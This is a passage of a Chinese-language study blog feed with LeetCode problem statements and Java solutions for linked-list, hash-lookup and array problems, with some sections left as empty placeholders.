p1; &#125; if(p2 != null)&#123; cur.next = p2; &#125; return head.next; &#125;&#125; 24. Swap Nodes in Pairs题目描述给定一个链表，对于每两个相邻的节点，交换其位置 Given 1-&gt;2-&gt;3-&gt;4, you should return the list as 2-&gt;1-&gt;4-&gt;3. 代码实现123456789101112131415161718192021222324252627282930/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode swapPairs(ListNode head) &#123; //虚拟头节点 ListNode dummy = new ListNode(0); dummy.next = head; ListNode cur = dummy; while(cur.next != null &amp;&amp; cur.next.next != null)&#123; ListNode node1 = cur.next; ListNode node2 = node1.next; ListNode nextNode = node2.next; node2.next = node1; node1.next = nextNode; cur.next = node2; cur = node1; &#125; return dummy.next; &#125;&#125; 25. Reverse Nodes in k-Group题目描述给定一个链表，每k个节点为一组，反转每一组的k个节点。k为正整数且小于等于链表长度。如果链表长度不是k的整数倍，剩余部分不需要进行反转。 Given this linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5 For k = 2, you should return: 2-&gt;1-&gt;4-&gt;3-&gt;5 For k = 3, you should return: 3-&gt;2-&gt;1-&gt;4-&gt;5 代码实现12 147. Insertion Sort List题目描述为一个链表进行插入排序 代码实现12 148. Sort List题目描述O(n log n) 为一个链表进行排序 归并排序 代码实现12 必要的时候也要改变链表的值 237. Delete Node in a Linked List题目描述给定链表中的一个节点，删除该节点 代码实现12345678910111213141516171819/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public void deleteNode(ListNode node) &#123; if(node == null) return; if(node.next == null) node = null; node.val = node.next.val; ListNode nextNode = node.next; node.next = nextNode.next; &#125;&#125; 双指针技术。 19. Remove Nth Node From End of List题目描述给定一个链表，删除倒数第n个节点 Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n = 2. 1-&gt;2-&gt;3-&gt;5. 代码实现12345678910111213141516171819202122232425262728/** * Definition for singly-linked list. * public class ListNode &#123; * int val; * ListNode next; * ListNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public ListNode removeNthFromEnd(ListNode head, int n) &#123; //这里假设输入的数据是符合要求的，不作校验 ListNode dummy = new ListNode(0); dummy.next = head; ListNode p = dummy; ListNode q = dummy; for(int i=0;i&lt;n+1;i++)&#123; q = q.next; &#125; while(q != null)&#123; p = p.next; q = q.next; &#125; ListNode delNode = p.next; p.next = delNode.next; return dummy.next; &#125;&#125; 61. Rotate List题目描述给定一个链表，让这个链表向右旋转k位，其中k为非负数。 Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL, k = 2 Output: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL rotate 1 steps to the right: 5-&gt;1-&gt;2-&gt;3-&gt;4-&gt;NULL rotate 2 steps to the right: 4-&gt;5-&gt;1-&gt;2-&gt;3-&gt;NULL Input: 0-&gt;1-&gt;2-&gt;NULL, k = 4 Output: 2-&gt;0-&gt;1-&gt;NULL rotate 1 steps to the right: 2-&gt;0-&gt;1-&gt;NULL rotate 2 steps to the right: 1-&gt;2-&gt;0-&gt;NULL rotate 3 steps to the right: 0-&gt;1-&gt;2-&gt;NULL rotate 4 steps to the right: 2-&gt;0-&gt;1-&gt;NULL 代码实现12 143. Reorder List题目描述给定一个链表，L: L0→L1→…→Ln-1→Ln, 将其变为: L0→Ln→L1→Ln-1→L2→Ln-2→… Given {1,2,3,4}, reorder it to {1,4,2,3}. 代码实现12 234. Palindrome Linked List题目描述给定一个链表，判断这个链表是否为回文链表。 代码实现12]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[三、查找问题]]></title>
    <url>%2F2018%2F08%2F16%2F%E4%B8%89%E3%80%81%E6%9F%A5%E6%89%BE%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[查找问题。 目录 349.Intersection of Two Arrays √ 350.Intersection of Two Arrays II √ 242.Valid Anagram √ 202.Happy Number √ 290.Word Pattern √ 205.Isomorphic Strings √ 451.Sort Characters By Frequency √ 1.Two Sum √ 15.3Sum × 18.4Sum × 16.3Sum Closest × 454.4Sum II × 49.Group Anagrams × 447.Number of Boomerangs × 149.Max Points on a Line × 219.Contains Duplicate II √ 217.Contains Duplicate √ 220.Contains Duplicate III × 349. Intersection of Two Arrays题目描述给定两个数组nums，求两个数组的公共元素。 如nums1=[1,2,2,1],nums2=[2,2],结果为[2]。 结果中每个元素只能出现一次，出现的顺序可以是任意的。 代码实现1234567891011121314151617181920class Solution &#123; public int[] intersection(int[] nums1, int[] nums2) &#123; Set&lt;Integer&gt; set = new HashSet&lt;&gt;(); for(int temp:nums1)&#123; set.add(temp); &#125; Set&lt;Integer&gt; resultSet = new HashSet&lt;&gt;(); for(int temp:nums2)&#123; if(set.contains(temp))&#123; resultSet.add(temp); &#125; &#125; int[] arr = new int[resultSet.size()]; int i=0; for(int temp:resultSet)&#123; arr[i++] = temp; &#125; return arr; &#125;&#125; 350. Intersection of Two Arrays II题目描述给定两个数组nums，求两个数组的交集。 如nums1=[1,2,2,1],nums2=[2,2],结果为[2,2]。 出现的顺序可以是任意的。 代码实现123456789101112131415161718192021222324252627class Solution &#123; public int[] intersect(int[] nums1, int[] nums2) &#123; Map&lt;Integer,Integer&gt; map = new HashMap&lt;Integer,Integer&gt;(); List&lt;Integer&gt; list = new ArrayList&lt;Integer&gt;(); for(int temp:nums1)&#123; if(map.containsKey(temp))&#123; map.put(temp,map.get(temp)+1); &#125;else&#123; map.put(temp,1); &#125; &#125; for(int temp:nums2)&#123; if(map.containsKey(temp) &amp;&amp; map.get(temp)&gt;0)&#123; list.add(temp); map.put(temp,map.get(temp)-1); &#125; &#125; int[] arr = new int[list.size()]; for(int i=0;i&lt;arr.length;i++)&#123; arr[i] = list.get(i); &#125; return arr; &#125;&#125; 操作 普通数组实现 顺序数组实现 二分搜索树（平衡） 哈希表 插入 O(1) O(n) O(logn) O(1) 查找 O(n) O(logn) O(logn) O(1) 删除 O(n) O(n) O(logn) O(1) 既然哈希表这么优秀，为什么不用他呢？ 哈希表的缺点是失去了数据的顺序性。 而二分搜索树可以保证数据的有序性：可以轻易地实现以下功能： 数据集中的最大值和最小值 某个元素的前驱和后继 某个元素的floor和ceil 某个元素的排位rank 选择某个排位的元素select 242. Valid Anagram题目描述判断字符串t是否是字符串s变换字符顺序后得到的结果。 For example,s = “anagram”, t = “nagaram”, return true.s = “rat”, t = “car”, return false. 代码实现1234567891011121314151617181920212223242526272829303132class Solution &#123; public boolean isAnagram(String s, String t) &#123; HashMap&lt;String,Integer&gt; map = new HashMap&lt;&gt;(); //都为空，这里是true if(s.length() == 0 &amp;&amp; t.length() == 0)&#123; return true; &#125; //长度不一样，直接pass if(s.length() != t.length())&#123; return false; &#125; //将s中每个字母进行计数，存放在map中 for(int i=0;i&lt;s.length();i++)&#123; if(map.containsKey(Character.toString(s.charAt(i))))&#123; map.put(Character.toString(s.charAt(i)),map.get(Character.toString(s.charAt(i)))+1); &#125;else&#123; map.put(Character.toString(s.charAt(i)),1); &#125; &#125; //对t的元素进行一一验证，验证一个就将数量减一 for(int i=0;i&lt;t.length();i++)&#123; if(map.containsKey(Character.toString(t.charAt(i))) &amp;&amp; map.get(Character.toString(t.charAt(i)))&gt;0)&#123; map.put(Character.toString(t.charAt(i)),map.get(Character.toString(t.charAt(i)))-1); &#125;else&#123; return false; &#125; &#125; return true; &#125;&#125; 202. Happy Number题目描述判断一个数是否为happy number，happy number是指，一个数，将其替换为其各位数字的平方和，重复这个过程，如果最终能得到1，这是happy number，如果这个过程陷入了一个不包含1的循环，则不是happy number。 Example: 19 is a happy number 1^2 + 9^2 = 82 8^2 + 2^2 = 68 6^2 + 8^2 = 100 1^2 + 0^2 + 0^2 = 1 代码实现12345678910111213141516171819202122232425262728293031class Solution &#123; public boolean isHappy(int n) &#123; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); //n==1的话，就不用比较了，直接true if(n == 1)&#123; return true; &#125; //n != 1时进行循环 while(n!=1)&#123; //看map里面有没有平方和的值，有的话说明循环了，直接false，没有就put进去 if(!map.containsKey(n))&#123; map.put(n,1); &#125;else&#123; return false; &#125; n = aaa(n); &#125; return true; &#125; //计算平方和 private int aaa(Integer n)&#123; int sum = 0, tmp; while(n&gt;0)&#123; tmp = n % 10; sum += tmp * tmp; n /= 10; &#125; return sum; &#125;&#125; 290. Word Pattern题目描述给出一个模式以及一个字符串，判断这个字符串是否符合模式？ Examples: pattern = “abba”, str = “dog cat cat dog” should return true. pattern = “abba”, str = “dog cat cat fish” should return false. pattern = “aaaa”, str = “dog cat cat dog” should return false. pattern = “abba”, str = “dog dog dog dog” should return false. 代码实现123456789101112131415161718192021222324252627class Solution &#123; public boolean wordPattern(String pattern, String str) &#123; String[] sc = str.split(" "); char[] c = pattern.toCharArray(); Map&lt;String,String&gt; map = new HashMap&lt;&gt;(); //若两者长度不相等，那么直接false if(c.length != sc.length)&#123; return false; &#125; //以sc中的元素为key,以c中的元素为value for(int i=0;i&lt;sc.length;i++)&#123; //若map中没有这个key,则判断他的value是否已经被用了，用了则false，否则Put进去 if(!map.containsKey(sc[i]))&#123; if(map.containsValue(Character.toString(c[i])))&#123; return false; &#125; map.put(sc[i], Character.toString(c[i])); &#125;else&#123; //若有这个key，但是value不相等是不行的 if(!map.get(sc[i]).equals(Character.toString(c[i])))&#123; return false; &#125; &#125; &#125; return true; &#125;&#125; 205. Isomorphic Strings题目描述判断两个字符串是否同构？ 如果我们能够寻找到一个字符集到字符集的映射，使得通过这个字符集的映射，s可以转变为t，则称为s和t同构。 For example, Given “egg”, “add”, return true. Given “foo”, “bar”, return false. Given “paper”, “title”, return true. 代码实现12345678910111213141516171819202122class Solution &#123; public boolean isIsomorphic(String s, String t) &#123; Map&lt;Character,Character&gt; map = new HashMap&lt;&gt;(); if(s==null &amp;&amp; t==null) return true; char[] sc = s.toCharArray(); char[] tc = t.toCharArray(); for(int i=0;i&lt;sc.length;i++)&#123; if(!map.containsKey(sc[i]))&#123; if(map.containsValue(tc[i]))&#123; return false; &#125; map.put(sc[i],tc[i]); &#125;else&#123; if(!map.get(sc[i]).equals(tc[i]))&#123; return false; &#125; &#125; &#125; return true; &#125;&#125; 451. Sort Characters By Frequency题目描述给定一个字符串，按照字母出现频率的倒序重组整个字符串 Input: “tree”；Output:”eert”Input:”cccaaa”；Output:”cccaaa”Input:”Aabb”；Output:”bbAa” 对于相同频次的字母，顺序任意，大小写敏感。 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142class Solution &#123; public String frequencySort(String s) &#123; Map&lt;Character,Integer&gt; map = new HashMap&lt;&gt;(); for(char c:s.toCharArray())&#123; if(!map.containsKey(c))&#123; map.put(c, 1); &#125;else&#123; map.put(c,map.get(c)+1); &#125; &#125; //定义一个类型为list的数组 List&lt;Character&gt;[] bucket = new List[s.length()+1]; //遍历key,每个key对应他的出现频率 for(Character c:map.keySet())&#123; //取出出现频率 int frequence = map.get(c); //如果数组对应频率下表里啥都没有，则新建 if(bucket[frequence] == null)&#123; bucket[frequence] = new ArrayList&lt;&gt;(); &#125; //将key放到对应频率下表的数组中,这样，频率出现高的肯定放在数组的后面了 bucket[frequence].add(c); &#125; StringBuilder sb = new StringBuilder(); //从后往前遍历数组，先取出频率高的key for(int i=bucket.length-1;i&gt;=0;i--)&#123; if(bucket[i] != null)&#123; //拿到key for(char c:bucket[i])&#123; //拿到出现频率 for(int j=0;j&lt;map.get(c);j++)&#123; sb.append(c); &#125; &#125; &#125; &#125; return sb.toString(); &#125;&#125; 1. Two Sum题目描述给出一个整形数组nums，返回这个数组中两个数字的索引值i和j，使得nums[i]+nums[j] 等于一个给定target值，两个索引不能相等。 Given nums = [2, 7, 11, 15], target = 9, Because nums[0] + nums[1] = 2 + 7 = 9,return [0, 1]. 解题思路查找表，将所有元素放入查找表，之后对于每一个元素a，查找target-a是否存在。 代码实现123456789101112131415class Solution &#123; public int[] twoSum(int[] nums, int target) &#123; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); int[] result = new int[2]; for(int i=0;i&lt;nums.length;i++)&#123; if(map.containsKey(target-nums[i]))&#123; result[0] = i; result[1] = map.get(target-nums[i]); return result; &#125; map.put(nums[i],i); &#125; return result; &#125;&#125; 15. 3Sum题目描述给出一个整形数组，寻找其中的所有不同的三元组(a,b,c)，使得a+b+c=0 Given array nums = [-1, 0, 1, 2, -1, -4], A solution set is:[ [-1, 0, 1], [-1, -1, 2]] 代码实现12 18. 4Sum题目描述给出一个整形数组，寻找其中的所有不同的三元组(a,b,c,d)，使得a+b+c+d=target Given array nums = [1, 0, -1, 0, -2, 2], and target = 0. A solution set is:[ [-1, 0, 0, 1], [-2, -1, 1, 2], [-2, 0, 0, 2]] 代码实现12 16. 3Sum Closest题目描述给出一个整形数组,寻找其中的三个元素a,b,c，使得a+b+c的值最接近另外一个给定的数字target Given array nums = [-1, 2, 1, -4], and target = 1. The sum that is closest to the target is 2. (-1 + 2 + 1 = 2). 代码实现12 454. 4Sum II题目描述给出四个整形数组A,B,C,D，寻找有多少i,j,k,l的组合，使得A[i]+B[j]+C[k]+D[l] == 0.其中，A,B,C,D中均含有相同元素个数N，且0&lt;=N&lt;=500 Input:A = [ 1, 2]B = [-2,-1]C = [-1, 2]D = [ 0, 2] Output:2 Explanation:The two tuples are: (0, 0, 0, 1) -&gt; A[0] + B[0] + C[0] + D[1] = 1 + (-2) + (-1) + 2 = 0 (1, 1, 0, 0) -&gt; A[1] + B[1] + C[0] + D[0] = 2 + (-1) + (-1) + 0 = 0 代码实现12 49. Group Anagrams题目描述给出一个字符串数组，将其中所有可以通过颠倒字符顺序产生相同结果的单词进行分组。 Input: [“eat”, “tea”, “tan”, “ate”, “nat”, “bat”], Output:[ [“ate”,”eat”,”tea”], [“nat”,”tan”], [“bat”]] 代码实现12 447. Number of Boomerangs题目描述给出一个平面上的n个点，寻找存在多少个由这些点构成的三元组(i,j,k)，使得i,j两点的距离等于i,k两点的距离。其中n最多为500，且所有的点坐标的范围在[-10000,10000]之间。 Input:[[0,0],[1,0],[2,0]] Output:2 Explanation:The two boomerangs are [[1,0],[0,0],[2,0]] and [[1,0],[2,0],[0,0]] 代码实现12 149. Max Points on a Line题目描述给出2D平面上的n个点，求出最多有多少个点再一条直线上。 代码实现12 219. Contains Duplicate II题目描述给出一个整形数组nums和一个整数k，是否存在索引i和j,使得nums[i] == nums[j]，且i和j之间的差不超过k 代码实现12345678910111213141516class Solution &#123; public boolean containsNearbyDuplicate(int[] nums, int k) &#123; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); for(int i=0;i&lt;nums.length;i++)&#123; if(map.containsKey(nums[i]))&#123; int index1 = i; int index2 = map.get(nums[i]); if(Math.abs(index2-index1)&lt;=k)&#123; return true; &#125; &#125; map.put(nums[i],i); &#125; return false; &#125;&#125; 217. Contains Duplicate题目描述给出一个整形数组，若数组中存在相同的元素，则返回true,否则返回false 代码实现123456789101112class Solution &#123; public boolean containsDuplicate(int[] nums) &#123; Map&lt;Integer,Integer&gt; map = new HashMap&lt;&gt;(); for(int i=0;i&lt;nums.length;i++)&#123; if(map.containsKey(nums[i]))&#123; return true; &#125; map.put(nums[i],i); &#125; return false; &#125;&#125; 220. Contains Duplicate III题目描述给出一个整形数组nums,是否存在索引i和j，使得nums[i]和nums[j]之间的差别不超过给定的整数t，且i和j之间的差别不超过给定的整数k. 代码实现12]]></content>
      <tags>
        <tag>leetcode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[二、数组问题]]></title>
    <url>%2F2018%2F08%2F16%2F%E4%BA%8C%E3%80%81%E6%95%B0%E7%BB%84%E9%97%AE%E9%A2%98%2F</url>
    <content type="text"><![CDATA[数组问题。 目录 283.Move Zeros 27.Remove Element 26.Remove Duplicates from Sorted Array 80.Remove Duplicates from Sorted Array II 75.Sort Colors 88.Merge Sorted Array 215.Kth Largest Element in an Array 167.Two Sum II - Input array is sorted 125.Valid Palindrome 344.Reverse String 345.Reverse Vowels of a String 11.Container With Most Water 209. Minimum Size Subarray Sum 3. Longest Substring Without Repeating Characters 283.Move Zeros题目描述给定一个数组nums，写一个函数，将数组中所有的0挪到数组的末尾，而维持其他所有非0元素的相对位置。 例如：nums=[0,1,0,3,12],函数运行后结果是[1,3,12,0,0] 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566/** * 时间复杂度O(n) * 空间复杂度O(n) * 最原始的方式 */public static void moveZeroes01(int[] nums) &#123; int[] nonZeroArray = new int[nums.length]; int j=0; //1. 先遍历原数组，找出所有非零元素，放到新数组中 for(int i=0;i&lt;nums.length;i++)&#123; if(nums[i] != 0)&#123; nonZeroArray[j] = nums[i]; j++; &#125; &#125; //2. 给新数组末尾添加0 for(int i=j;i&lt;nums.length;i++)&#123; nonZeroArray[i] = 0; &#125; //3. 给原数组重新赋值 for(int i=0;i&lt;nums.length;i++)&#123; nums[i] = nonZeroArray[i]; &#125;&#125;/** * 时间复杂度O(n) * 空间复杂度O(1) * 不需要额外空间的方式 * 直接将非零元素放到数组的最前面就好了 */public static void moveZeroes02(int[] nums) &#123; //代表非零元素从头开始存放的一个索引 int j=0; for(int i=0;i&lt;nums.length;i++)&#123; if(nums[i] != 0)&#123; nums[j++] = nums[i]; &#125; &#125; //j之前都是非零元素，后面直接赋值为0即可 while(j&lt;nums.length)&#123; nums[j++] = 0; &#125;&#125;/** * 直接将非零元素和数组前面的元素交换，免去了最后还要赋0的操作 * @param nums */public void moveZeroes(int[] nums) &#123; //代表非零元素从头开始存放的一个索引 int j=0; for(int i=0;i&lt;nums.length;i++)&#123; if(nums[i] != 0)&#123; if(i != j)&#123; int temp = 0; temp = nums[i]; nums[i] = nums[j]; nums[j] = temp; j++; &#125;else&#123; j++; &#125; &#125; &#125;&#125; 27. Remove Element题目描述给定一个数组Nums和一个数值val，将数组中所有等于val的元素删除，并返回剩余元素的个数。 例如:nums = [3,2,2,3],val=3;返回2，且nums中前两个元素为2 代码实现123456789101112class Solution &#123; public int removeElement(int[] nums, int val) &#123; int i = 0; for (int j = 0; j &lt; nums.length; j++) &#123; if (nums[j] != val) &#123; nums[i] = nums[j]; i++; &#125; &#125; return i; &#125;&#125; 26. Remove Duplicates from Sorted Array题目描述给定一个有序数组，对数组中的元素去重，使得原数组的每个元素只有一个。返回去重后数组的长度值。 Given nums = [1,1,2], Your function should return length = 2, with the first two elements of nums being 1 and 2 respectively. 代码实现123456789101112class Solution &#123; public int removeDuplicates(int[] nums) &#123; int j=0; for(int i=1;i&lt;nums.length;i++)&#123; if(nums[i] != nums[j])&#123; j++; nums[j] = nums[i]; &#125; &#125; return j+1; &#125;&#125; 80. Remove Duplicates from Sorted Array II题目描述给定一个有序数组，对数组中的元素去重，使得原数组的每个元素最多保留两个。返回去重后数组的长度值。 Given sorted array nums = [1,1,1,2,2,3], Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3. 代码实现12345678910111213//时间复杂度O(n)//空间复杂度O(1)class Solution &#123; public int removeDuplicates(int[] nums) &#123; int j = 0; for(int temp:nums)&#123; if(j&lt;2 || temp&gt;nums[j-2])&#123; nums[j++] = temp; &#125; &#125; return j; &#125;&#125; 75. Sort Colors题目描述给定一个有n个元素的数组，数组中元素的取值只有0,1,2三种可能，为这个数组排序. 代码实现 计数排序 1234567891011121314151617181920//比较简单但是麻烦的方法----计数排序class Solution &#123; public void sortColors(int[] nums) &#123; int[] count = new int[3]; for(int i=0;i&lt;nums.length;i++)&#123; //要小心数组越界问题，但是这里暂不考虑 count[nums[i]] ++; &#125; int index = 0; for(int i=0;i&lt;count[0];i++)&#123; nums[index++] = 0; &#125; for(int i=0;i&lt;count[1];i++)&#123; nums[index++] = 1; &#125; for(int i=0;i&lt;count[2];i++)&#123; nums[index++] = 2; &#125; &#125;&#125; 计数排序简化 1234567891011121314151617class Solution &#123; public void sortColors(int[] nums) &#123; int[] count = new int[3]; for(int i=0;i&lt;nums.length;i++)&#123; //要小心数组越界问题，但是这里暂不考虑 count[nums[i]] ++; &#125; int index = 0; //将上面三个分开的for语句整合到一起 for(int i=0;i&lt;count.length;i++)&#123; while(count[i] &gt; 0)&#123; nums[index++] = i; count[i]--; &#125; &#125; &#125;&#125; 三路快排 123456789101112131415161718192021222324class Solution &#123; public void sortColors(int[] nums) &#123; int zero = -1;//nums[0...zero] == 0 int two = nums.length;//nums[two...n-1] == 2 for(int i=0;i&lt;two;)&#123; if(nums[i] == 1)&#123;//最简单的情况，直接加一即可 i++; &#125;else if(nums[i] == 2)&#123;//如果为2，那么就将这个2与two进行交换 two--; swap(nums,i,two); &#125;else&#123;//如果为0，那么久与zero交换 zero++; swap(nums,i,zero); i++; &#125; &#125; &#125; private void swap(int[] nums,int i,int j)&#123; int temp = nums[i]; nums[i] = nums[j]; nums[j] = temp; &#125;&#125; 88. Merge Sorted Array题目描述给定两个有序整形数组nums1,nums2,将nums2中的元素归并到nums1中,最后还要保证num1有序 You may assume that nums1 has enough space (size that is greater or equal to m + n) to hold additional elements from nums2.所以不需要重新新建一个数组来存放这两个数组的合并集； 代码实现12345678910111213141516171819202122232425class Solution &#123; public void merge(int[] nums1, int m, int[] nums2, int n) &#123; int k = m+n-1; for(int i=m+n-1;i&gt;=0;i--)&#123; //归并排序的合并过程 if(m&gt;0 &amp;&amp; n&gt;0)&#123; if(nums1[m-1] &gt; nums2[n-1])&#123; nums1[i] = nums1[m-1]; m--; &#125;else&#123; nums1[i] = nums2[n-1]; n--; &#125; &#125; else if(m&gt;0)&#123; nums1[i] = nums1[m-1]; m--; &#125; else if(n&gt;0)&#123; nums1[i] = nums2[n-1]; n--; &#125; &#125; &#125;&#125; 215. Kth Largest Element in an Array题目描述在一个整数序列中寻找第k大的元素，如给定数组[3，2，1，5，6，4]，k=2,结果是5 You may assume k is always valid, 1 ≤ k ≤ array’s length. 代码实现123456789101112131415161718192021222324252627class Solution &#123; public int findKthLargest(int[] nums, int k) &#123; quickSort(nums,0,nums.length-1); return nums[nums.length-k]; &#125; //挖坑法两路快排 private void quickSort(int[] nums, int left, int right) &#123; if(left&gt;right) return; int i = left,j = right; int temp = nums[left]; while(i &lt; j)&#123; while(nums[j] &gt;= temp &amp;&amp; i&lt;j)&#123; j--; &#125; nums[i] = nums[j]; while(nums[i] &lt;= temp &amp;&amp; i&lt;j)&#123; i++; &#125; nums[j] = nums[i]; &#125; nums[i] = temp; quickSort(nums,left,i-1); quickSort(nums,i+1,right); &#125;&#125; 167. Two Sum II - Input array is sorted题目描述给定一个有序整型数组和一个整数target，在其中寻找两个元素，使其和为target。返回这两个数的索引。 例如：numbers=[2,7,11,15],target=9,返回数字2，7的索引1，2（索引从1开始计算） You may assume that each input would have exactly one solution and you may not use the same element twice. 注意这里规范了返回解的特点：一定有解并且只有一个解 代码实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970//暴力破解是比较简单的，但是超时，因为时间复杂度为O(n^2)class Solution &#123; public int[] twoSum(int[] numbers, int target) &#123; int[] result = new int[2]; for(int i=0;i&lt;numbers.length;i++)&#123; for(int j=i+1;j&lt;numbers.length;j++)&#123; if(target == (numbers[i]+numbers[j]))&#123; result[0] = i+1; result[1] = j+1; &#125; &#125; &#125; return result; &#125;&#125;//第二种思路是，外面一层循环遍历，里面用二分查找法进行查找，时间复杂度为O(nlogn)class Solution &#123; public int[] twoSum(int[] numbers, int target) &#123; int[] result = new int[2]; for(int i=0;i&lt;numbers.length-1;i++)&#123; //对后面的值进行二分查找，一找到则返回 int r = binarySearch(numbers,i+1,numbers.length-1,target-numbers[i]); if(r != -1)&#123; result[0] = i+1; result[1] = r+1; break; &#125; &#125; return result; &#125; private int binarySearch(int[] numbers,int lo,int hi,int target)&#123; while(lo&lt;=hi)&#123; int mid = lo+(hi-lo)/2; if(numbers[mid] == target)&#123; return mid; &#125;else if(numbers[mid] &gt; target)&#123; hi = mid-1; &#125;else&#123; lo = mid+1; &#125; &#125; return -1; &#125;&#125;//第三种思路，就是一头一尾两个指针对应的值相加，等于就返回，小于就将头指针向后移动--充分利用数组的特性class Solution &#123; public int[] twoSum(int[] numbers, int target) &#123; int[] result = new int[2]; int i=0,j=numbers.length-1; while(i&lt;j)&#123; if(numbers[i]+numbers[j] == target)&#123; result[0] = i+1; result[1] = j+1; break; &#125;else if(numbers[i]+numbers[j] &lt; target)&#123; i++; &#125;else&#123; j--; &#125; &#125; return result; &#125; &#125; 125. Valid Palindrome题目描述给定一个字符串，只看其中的数字和字母，忽略大小写，判断这个字符串是否为回文串？ 例如:”A man,a plan,a canal;Panama”是回文串“race a car”不是回文串 代码实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657//暴力破解，逻辑上可能是对的，试了几个，结果都是对的，但是效率有点低，不能通过class Solution &#123; public boolean isPalindrome(String s) &#123; char[] charArray = new char[s.length()]; for(int i=0;i&lt;charArray.length;i++)&#123; charArray[i] = s.toLowerCase().charAt(i); &#125; int i=0,j=charArray.length-1; while(i&lt;j)&#123; if(((charArray[i]&gt;='a'&amp;&amp;charArray[i]&lt;='z') || (charArray[i]&gt;='0'&amp;&amp;charArray[i]&lt;='9')) &amp;&amp; ((charArray[j]&gt;='a'&amp;&amp;charArray[j]&lt;='z') || (charArray[j]&gt;='0'&amp;&amp;charArray[j]&lt;='9')) &amp;&amp; charArray[i] == charArray[j])&#123; i++; j--; &#125;else if(!((charArray[i]&gt;='a'&amp;&amp;charArray[i]&lt;='z') || (charArray[i]&gt;='0'&amp;&amp;charArray[i]&lt;='9')))&#123; i++; &#125;else if(!((charArray[j]&gt;='a'&amp;&amp;charArray[j]&lt;='z') || (charArray[j]&gt;='0'&amp;&amp;charArray[j]&lt;='9')))&#123; j--; &#125;else&#123; return false; &#125; &#125; return true; &#125;&#125;//用java自带的类来解决数字和字母的判断，就通过了...class Solution &#123; public boolean isPalindrome(String s) &#123; if(s.isEmpty())&#123; //空字符串认为是回文串 return true; &#125; int i=0,j=s.length()-1; char cHead, cTail; while(i&lt;=j)&#123; cHead = s.charAt(i); cTail = s.charAt(j); if(!Character.isLetterOrDigit(cHead))&#123; i++; &#125;else if(!Character.isLetterOrDigit(cTail))&#123; j--; &#125;else&#123; if(Character.toLowerCase(cHead) != Character.toLowerCase(cTail))&#123; return false; &#125; i++; j--; &#125; &#125; return true; &#125;&#125; java判断是字母或者数字的手段： 123456789public static boolean isLetterOrDigit(int codePoint) &#123; return ((((1 &lt;&lt; Character.UPPERCASE_LETTER) | (1 &lt;&lt; Character.LOWERCASE_LETTER) | (1 &lt;&lt; Character.TITLECASE_LETTER) | (1 &lt;&lt; Character.MODIFIER_LETTER) | (1 &lt;&lt; Character.OTHER_LETTER) | (1 &lt;&lt; Character.DECIMAL_DIGIT_NUMBER)) &gt;&gt; getType(codePoint)) &amp; 1) != 0;&#125; 344. Reverse String题目描述给定一个字符串，返回这个字符串的倒序字符串。如”hello”,返回”olleh”，类似于翻转一个数组。 代码实现1234567891011121314class Solution &#123; public String reverseString(String s) &#123; char[] arr = s.toCharArray(); int i=0,j=s.length()-1; while(i&lt;j)&#123; char temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; i++; j--; &#125; return new String(arr); &#125;&#125; 345. Reverse Vowels of a String题目描述给定一个字符串，将该字符串中的元音字母翻转。 如给出“hello”，返回”holle”如给出”leetcode”，返回”leotcede” 提示：A、E、I、O、U通常都是元音字母 代码实现123456789101112131415161718192021222324class Solution &#123; public String reverseVowels(String s) &#123; String vowels = "aeiouAEIOU"; int i=0,j=s.length()-1; char[] arr = s.toCharArray(); while(i&lt;j)&#123; while(!vowels.contains(arr[i]+"") &amp;&amp; i&lt;j)&#123; i++; &#125; while(!vowels.contains(arr[j]+"") &amp;&amp; i&lt;j)&#123; j--; &#125; swap(arr,i,j); i++;j--; &#125; return new String(arr); &#125; private void swap(char[] arr,int i,int j)&#123; char temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; &#125;&#125; 11. Container With Most Water题目描述给出一个非负整数数组a1,a2,a3…,an，每一个整数表示一个竖立在坐标轴x位置的一堵高度为ai的墙，选择两堵墙，和x轴构成的容器可以容纳更多的水。 代码实现1234567891011121314151617//两边夹击，秉持越高的则越有希望是最大的，所以每次比较都取高的不动，并且保持一个目前的最大值class Solution &#123; public int maxArea(int[] height) &#123; int i=0,j=height.length-1; int matrix = 0; while(i&lt;j)&#123; //取大的 matrix = Math.max(matrix,Math.min(height[i],height[j])*(j-i)); //矮的移动 if(height[i]&gt;height[j]) j--; else i++; &#125; return matrix; &#125;&#125; 209. Minimum Size Subarray Sum题目描述给定一个整型数组和一个数字s，找到数组中最短的一个连续子数组，使得连续子数组的数字和sum&gt;=s，返回这个最短的连续子数组的返回值。 如，给定数组[2,3,1,2,4,3]，s=7,答案为[4,3]，返回2 代码实现12345678910111213141516171819202122232425262728293031class Solution &#123; public int minSubArrayLen(int s, int[] nums) &#123; //初始化两个指针分别为0和-1，这两个边界之间不包含任何数组元素 int l=0,r=-1; //初始化sum，即元素之和，用于存储每次循环的子数组之和 int sum = 0; //初始化元素最少个数为长度+1，是一个不可能取到的值，要取比较大的值，这与下面math.min取小值相关联 int res = nums.length+1; //只要左指针小于数组长度，那么就有比较的意义 while(l&lt;nums.length)&#123; //右指针不越界的情况下，和小于目标值，那么窗口右边扩展一格 if(r+1 &lt; nums.length &amp;&amp; sum &lt; s)&#123; r++; sum += nums[r]; 